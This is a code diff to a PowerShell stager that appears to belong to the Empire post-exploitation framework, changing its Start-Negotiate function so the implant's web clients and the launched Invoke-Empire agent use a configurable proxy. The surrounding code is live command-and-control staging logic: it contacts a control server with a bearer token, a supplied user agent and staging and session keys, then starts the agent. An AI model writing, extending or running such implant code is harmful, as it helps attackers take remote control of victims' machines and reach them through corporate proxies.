@@ -91,6 +91,10 @@ function Start-Negotiate {
         $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
     }
 
+    if ($Script:Proxy) {
+        $wc.Proxy = $Script:Proxy;   
+    }
+    
     # RC4 routing packet:
     #   sessionID = $ID
     #   language = POWERSHELL (1)
@@ -189,8 +193,7 @@ function Start-Negotiate {
 
     Start-Sleep -Seconds $($PI -as [Int]);
     $wc2=New-Object System.Net.WebClient;
-    $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-    $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+    $wc2.Proxy = $script:Proxy;
     $wc2.Headers.Add("User-Agent",$UA);
     $wc2.Headers.Add("Authorization", "Bearer $T");
     $wc2.Headers.Add("Content-Type", " application/json");
@@ -204,7 +207,7 @@ function Start-Negotiate {
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
-    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE";
+    Invoke-Empire -Servers @('NONE') -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
 Start-Negotiate -T $T -PI "REPLACE_POLLING_INTERVAL" -SK "REPLACE_STAGING_KEY" -UA $u;
